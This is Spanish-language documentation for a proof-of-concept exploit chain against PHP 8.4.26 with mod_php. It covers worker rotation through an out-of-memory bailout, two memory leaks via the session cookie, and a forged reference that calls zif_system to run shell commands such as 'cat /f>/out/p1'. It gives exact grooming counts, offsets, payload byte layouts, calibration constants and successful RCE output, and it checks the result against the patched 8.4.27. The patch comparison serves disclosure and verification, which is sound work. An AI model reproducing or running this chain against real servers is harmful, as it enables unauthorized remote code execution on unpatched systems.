# La cadena, etapa por etapa

Esta nota documenta lo que hace el PoC y qué se observó en el laboratorio. La
técnica y las constantes de calibración provienen de la investigación pública
de 9bie; este repositorio la porta a Python 3.9 y la instrumenta para poder
comparar 8.4.26 con 8.4.27.

## Precondiciones

- PHP 8.4.26 con `mod_php` y Apache prefork.
- `memory_limit=8M`, `display_errors=On`.
- `session.use_cookies=1`, `session.use_strict_mode=0`,
  `session.upload_progress.enabled=On`.
- Un único worker persistente (`MaxRequestWorkers=1`).
- Tráfico HTTP plano; no hace falta autenticación ni un endpoint especial.

La página `index.php` solo devuelve `OK`. Todo el estado relevante vive en el
motor de PHP, no en la aplicación.

## Etapa 0 — rotar el worker

El primer paso es asegurarse de que el proceso que va a groomear el heap es
nuevo. Se envían dos peticiones:

1. **A**: 1001 campos `f0000…f1000` de 3000 bytes, más `PHPSESSID=\x00`,
   `PHP_SESSION_UPLOAD_PROGRESS=pwn`, un archivo de 64 bytes y un campo `big`
   de 12 MB. El campo `big` supera `memory_limit` y provoca el bailout; el
   worker muere.
2. **B**: solo `PHPSESSID=attacksessionid0001` y el progreso. La inicialización
   de sesión recorre el heap corrupto y el hijo aborta.

El padre prefork detecta la muerte y crea un hijo limpio. Las pausas de 0.3 s y
0.5 s le dan tiempo a reaparecer.

```
cliente ── A (15 MB) ──► worker (OOM, abort)
        ── B (pequeña) ─► sesión sobre heap corrupto (abort)
                              │
                         prefork fork ──► worker nuevo
```

## Etapa 1 — leak del chunk base

Objetivo: obtener la base de 2 MB del chunk de Zend MM.

1. **Groom**: 1001 campos `p0000…p1000` de 1 byte, más el mismo bloque de
   sesión, archivo y `big` de 12 MB.
2. **Leak**: con la sesión `attacksessionid0001`, se añaden 841 campos
   (`stage1_n=841`) de 48 bytes y un campo `1999` de 79 bytes. El campo `1999`
   contiene un `zend_string` falso: en `+0x10` un tamaño de `0x1000` y en
   `+0x18` el byte `L`.
3. PHP serializa ese string falso en la cookie `PHPSESSID`; la respuesta lleva
   una cookie URL-encoded de **4096 bytes**.
4. El parser decodifica la cookie y busca valores de 8 bytes en
   `[0x7f0000000000, 0x800000000000)`. Agrupa por `valor & ~0x1FFFFF` (2 MB) y
   se queda con la moda; exige al menos 8 apariciones.

En el laboratorio:

```
STAGE1_COOKIE_BYTES=4096
chunk base = 0x7ffffc400000
```

La base cambia en cada ejecución por ASLR. Lo que no cambia es la alineación de
2 MB y la forma del leak.

## Etapa 2 — leak de `libphp.so`

Objetivo: obtener la base de `libphp.so` a partir de un puntero a
`zval_ptr_dtor`.

1. **Groom**: 1001 campos `f0000…f1000` de 39 bytes, más sesión, archivo y
   `big`.
2. **Leak**: 983 grupos `a0000[j]…a0982[j]`. Cada grupo aporta un valor de
   `stage2_v` bytes (`16` en bookworm), salvo el grupo `stage2_t=406`, que
   aporta 16 valores. Eso coloca una página de 56 bytes que parece un
   `HashTable`.
3. La cookie resultante tiene 16 bytes. Los bytes `[8:16]` son
   `nNextFreeElement|pDestructor`, es decir, un puntero a `zval_ptr_dtor`
   dentro de `libphp.so`.
4. Validación: el puntero debe estar en el rango de usuario, alineado a 4 KB
   tras restar el offset, y sus 12 bits bajos deben coincidir con
   `DTOR_OFFSET & 0xFFF`.

```
STAGE2_COOKIE_BYTES=16
libphp base = 0x7ffffe013000
```

El offset de `zval_ptr_dtor` se extrae del propio binario:

```
zif_system     0x465370
zval_ptr_dtor  0x65eb60
```

Con eso:

```
HTDATA = chunk + 0x690d8  = 0x7ffffc4690d8
ZIF    = libphp + 0x465370 = 0x7ffffe478370
```

`0x690d8` es el offset, relativo al chunk, del string vivo de 167 bytes que se
usará como carrier en la etapa 3.

## Etapa 3 — fake reference y `zif_system`

Objetivo: convertir el puntero de sesión en una referencia falsa cuyo
`pDestructor` sea `zif_system`, y ejecutar un comando.

### 3.1 Preparar el heap

Se envía una petición con:

- `PHPSESSID` de 19 bytes `a`;
- `PHP_SESSION_UPLOAD_PROGRESS` de 3 bytes `p`;
- seis pads de 31/31 bytes (`stage3_pads`), que colocan el fake reference en la
  posición esperada;
- el archivo de 64 bytes y el campo `big` de 12 MB (OOM);
- una cabecera `Cookie: PHPSESSID=aaaa…` de 32 bytes.

La cookie válida mantiene `PS(id)` vivo y hace que `php_session_initialize`
deje `send_cookie=0`. Sin ella, la inicialización de la siguiente petición
asignaría la cabecera `Set-Cookie` en `R0+16` y sobrescribiría
`val.type`.

### 3.2 Escribir el fake reference

La segunda petición usa el carrier de 15 bytes:

```
struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
```

Es un `zend_string` de 15 bytes que cae exactamente sobre
`PS(http_session_vars)`: conserva `gc` (rc=1, IS_REFERENCE), reescribe los 7
bytes bajos de `val.value` con `htdata` y deja el byte alto en `0x00`, porque
los punteros canónicos `0x00007f…` tienen ese byte a cero.

Después se envían 15 campos de 167 bytes con el fake `HashTable`. El layout,
en `htdata`:

| Offset | Campo | Valor |
| --- | --- | --- |
| `0x00` | `gc` | rc=1, IS_ARRAY |
| `0x08` | flags / nTableMask | `0x10` / `0xFFFFFFF8` |
| `0x10` | `arData` | `htdata + 0x20` |
| `0x18` | nNumUsed / nNumOfElements | 1 / 1 |
| `0x20` | nTableSize / puntero | 8 / 0 |
| `0x28` | nNextFreeElement | 0 |
| `0x30` | **pDestructor** | **`zif_system`** |
| `0x40` | fake `execute_data` | … |
| `0x80` | fake `zend_string` | rc=1, IS_STRING |
| `0x90` | longitud | `len(cmd)` |
| `0x98` | chars | comando + NUL |

El fake `execute_data` está en `htdata+0x40` (`data+0x20`): `num_args=1`,
`arg1` apunta a `htdata+0x80` y su tipo es `IS_STRING` (6). Cuando el motor
destruye la sesión, invoca `pDestructor` con ese `execute_data`; `zif_system`
lee el argumento y ejecuta el comando.

```
pDestructor(htdata+0x40)
  └─ zif_system("id>/out/p1")
       └─ /out/p1 = "uid=33(www-data) ..."
```

### 3.3 Límite de 14 bytes

El carrier tiene 167 bytes: `0x98` de cabecera, el comando y un NUL. El comando
máximo es de **14 bytes**:

```
id>/out/p1        (10)
cat /f>/out/p1    (14)
```

Para comandos más largos, la referencia usa un stager:

```
sh</out/c         (8)
```

donde `/out/c` es un script previamente colocado. Este PoC no implementa el
mecanismo de colocación; se limita a comandos de hasta 14 bytes. El límite es
una propiedad del payload, no del bug.

## Resultado

Contra 8.4.26:

```
[*] stage 1: chunk base = 0x7ffffc400000
[*] stage 2: libphp base = 0x7ffffe013000
[*] stage 3: HTDATA=0x7ffffc4690d8 ZIF=0x7ffffe478370
[+] RCE on stage 3 attempt 1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Contra 8.4.27, con los offsets extraídos de su propio `libphp.so`:

```
[*] stage 1: heap leak missed
STAGE1_COOKIE_BYTES=32
HEAP_LEAK_FAILED
```

La cookie ya no es de 4096 bytes: el leak desaparece en la primera etapa. No se
llega a la etapa 2 ni a la 3, así que el control no demuestra por sí solo que el
fake reference también esté bloqueado; demuestra que el primitivo de leak que
inicia la cadena ya no existe en 8.4.27.

## Qué cambió el parche

El changelog de PHP 8.4.27 (22 de octubre de 2026) describe el fix como:

> Fixed GHSA-w8hw-w9fx-j79w, GHSA-6wmf-4rv5-p3rp (Avoid state corruption via
> bailout).

Es decir, el problema es una corrupción de estado en el camino de bailout
(OOM), no una simple validación de entrada. El mismo fix aparece en 8.3.36,
8.2.35 y 8.5.12. Nuestra observación es consistente: el bailout de 8.4.26 deja
un `zend_string` falso serializable en la cookie; 8.4.27 ya no lo hace.

## Constantes del perfil bookworm

| Constante | Valor | Uso |
| --- | --- | --- |
| `stage1_n` | 841 | campos de 48 bytes en el leak 1 |
| `stage2_t` | 406 | grupo que aporta 16 valores |
| `stage2_v` | 16 | tamaño de cada valor en el leak 2 |
| `stage3_pads` | 6 × (31,31) | colocación del fake reference |
| `stage3_carrier` | `true` | carrier de 15 bytes |
| `stage3_cookie` | `true` | cookie válida en la etapa 3 |
| `htdata_offset` | `0x690d8` | string de 167 bytes |
| `zif_system` | `0x465370` | offset en libphp 8.4.26 |
| `zval_ptr_dtor` | `0x65eb60` | offset en libphp 8.4.26 |

Las constantes de grooming están calibradas para esta build. Cambiar de imagen,
de compilador o de configuración de Apache puede requerir recalibrar; los
offsets ELF se recalculan automáticamente.
